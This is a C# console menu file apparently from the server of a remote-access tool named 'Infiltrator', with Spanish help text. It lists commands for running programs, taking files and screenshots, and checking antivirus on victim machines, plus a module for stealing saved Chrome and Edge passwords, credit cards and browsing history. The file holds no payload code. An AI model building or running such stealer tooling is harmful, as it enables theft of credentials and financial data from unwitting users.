using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Server.GUI
{
    static class Menu
    {
        public static string asciiArt = @"
      _____        __ _ _ _             _                _____                            __   ___  
     |_   _|      / _(_| | |           | |              / ____|                          /_ | / _ \ 
       | |  _ __ | |_ _| | |_ _ __ __ _| |_ ___  _ __  | (___   ___ _ ____   _____ _ __   | || | | |
       | | | '_ \|  _| | | __| '__/ _` | __/ _ \| '__|  \___ \ / _ | '__\ \ / / _ | '__|  | || | | |
      _| |_| | | | | | | | |_| | | (_| | || (_) | |     ____) |  __| |   \ V |  __| |     | || |_| |
     |_____|_| |_|_| |_|_|\__|_|  \__,_|\__\___/|_|    |_____/ \___|_|    \_/ \___|_|     |_(_\___/ 
                                                                                                
                                                                                                
        ";


     public static void showMenu()
        {
            Console.Clear();
            Console.Title = "Infiltrator Control Panel";
            Console.SetWindowSize(100, 30);
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(asciiArt);
            Console.WriteLine("[+] Servidor iniciado exitosamente, utiliza help para ver comandos.");


        }

        public static void ShowHelp()
        {
            Console.WriteLine("\n\t==================================================================================");
            Console.WriteLine("\t=                               COMANDOS DISPONIBLES                             =");
            Console.WriteLine("\t==================================================================================");
            Console.WriteLine("\t+--------------------------------------------------------------------------------+");
            Console.WriteLine("\t| help: Muestra esta lista de comandos.                                          |");
            Console.WriteLine("\t| clients: Muestra los clientes que están conectados.                            |");
            Console.WriteLine("\t| browsers_module: Comandos para el módulo de navegadores.                       |");
            Console.WriteLine("\t| ID_CLIENTE exec <comando>: Ejecuta un comando en la máquina cliente.           |");
            Console.WriteLine("\t| ID_CLIENTE list_processes: Lista todos los procesos en la máquina cliente.     |");
            Console.WriteLine("\t| ID_CLIENTE get <archivo>: Obtiene un archivo de la máquina cliente.            |");
            Console.WriteLine("\t| ID_CLIENTE browsers: Lista los navegadores instalados en la máquina cliente.   |");
            Console.WriteLine("\t| ID_CLIENTE antivirus: Lista los antivirus instalados en la máquina cliente.    |");
            Console.WriteLine("\t| ID_CLIENTE system_info: Obtiene información del sistema de la máquina cliente. |");
            Console.WriteLine("\t| ID_CLIENTE network_info: Obtiene información de la red de la máquina cliente.  |");
            Console.WriteLine("\t| ID_CLIENTE shutdown: Apaga el ordenador del cliente.                           |");
            Console.WriteLine("\t| ID_CLIENTE reboot: Reinicia el ordenador del cliente tras 10 seg.              |");
            Console.WriteLine("\t| ID_CLIENTE disconnect: Desconecta al cliente.                                  |");
            Console.WriteLine("\t| ID_CLIENTE kill <PID>: Termina un proceso en la máquina cliente.               |");
            Console.WriteLine("\t| ID_CLIENTE screenshot: Captura de pantalla de la máquina cliente.              |");
            Console.WriteLine("\t+--------------------------------------------------------------------------------+");
        }

        public static void ShowStealerHelp()
        {   
            Console.WriteLine("\n\t===============================================================================================");
            Console.WriteLine("\t=                            COMANDOS PARA EL MÓDULO DE NAVEGADORES                           =");
            Console.WriteLine("\t===============================================================================================");
            Console.WriteLine("\t+---------------------------------------------------------------------------------------------+");
            Console.WriteLine("\t| ID_CLIENTE chrome_passwords: Envía un archivo con las contraseñas almacenadas en Chrome.    |");
            Console.WriteLine("\t| ID_CLIENTE chrome_ccs: Envía un archivo con las tarjetas de crédito almacenadas en Chrome.  |");
            Console.WriteLine("\t| ID_CLIENTE chrome_history: Envía un archivo con el historial de navegación de Chrome        |");
            Console.WriteLine("\t| ID_CLIENTE edge_passwords: Envía un archivo con las contraseñas almacenadas en Edge.        |");
            Console.WriteLine("\t| ID_CLIENTE edge_ccs: Envía un archivo con las tarjetas de crédito almacenadas en Edge.      |");
            Console.WriteLine("\t| ID_CLIENTE edge_history: Envía un archivo con el historial de navegación de Edge.           |");
            Console.WriteLine("\t+---------------------------------------------------------------------------------------------+");
            Console.WriteLine("\t[!] ATENCIÓN: Estos comandos no funcionarán si el usuario no tiene instalado el navegador.");
            Console.WriteLine("\t[*] INFO: Puedes comprobar los navegadores que tiene instalado el usuario con: <ID_CLIENTE browsers>.");
        }

        public static void ShowLoadingProgressBar(Action action)
        {
            int total = 100;
            int width = 50; // Width of the progress bar
            Console.CursorVisible = false;
            var thread = new Thread(() =>
            {
                for (int i = 0; i <= total; i++)
                {
                    DrawProgressBar(i, total, width);
                    Thread.Sleep(30); // Adjust the speed of the progress bar
                }
            });
            thread.Start();

            try
            {
                action();
            }
            finally
            {
                thread.Join();
                Console.CursorVisible = true;
            }
        }

        public static void DrawProgressBar(int progress, int total, int width)
        {
            Console.SetCursorPosition(0, Console.CursorTop); // Reset the cursor position
            Console.Write("[");
            int pos = width * progress / total;
            for (int i = 0; i < width; i++)
            {
                if (i < pos) Console.Write("=");
                else if (i == pos) Console.Write(">");
                else Console.Write(" ");
            }
            Console.Write($"] {progress * 100 / total}%");
        }
    }
}
